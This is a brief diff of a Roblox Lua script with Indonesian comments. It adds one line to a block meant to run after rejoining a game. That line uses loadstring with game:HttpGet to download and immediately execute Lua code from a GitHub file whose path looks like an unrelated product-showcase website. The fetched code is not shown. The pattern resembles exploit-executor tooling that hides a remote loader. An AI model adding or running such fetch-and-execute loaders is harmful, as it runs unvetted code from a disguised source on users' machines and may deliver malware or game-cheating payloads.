@@ -38,7 +38,7 @@ repeat task.wait() until game:IsLoaded()
 -- ============================================================
 local scriptSetelahRejoin = [[
     -- Tunggu sampai loading screen Roblox benar-benar selesai
-    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vandawam/Aesthetic-Product-Showcase-frnt/refs/heads/main/src/pages/abc.lua"))()
 ]]
 
 -- ============================================================
